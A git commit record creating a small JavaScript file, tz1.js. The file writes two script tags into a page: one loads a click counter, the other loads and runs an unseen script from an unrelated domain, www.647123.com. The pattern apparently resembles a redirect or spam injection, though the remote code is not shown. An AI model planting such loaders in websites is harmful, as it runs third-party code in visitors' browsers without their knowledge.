9037fc09ae4e0bf7eee251910d1863bc5db6ae55
js999999999 <js-9@outlook.com>
2017-02-20 10:40:27 +0800

    Create tz1.js

---
+++ 2017cc/tz1.js
@@ -0,0 +1,3 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count24.51yes.com\/click.aspx?id=246094983&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script src=http:\/\/\www.647123.com\/20171cc/t1.js ><\/script>");
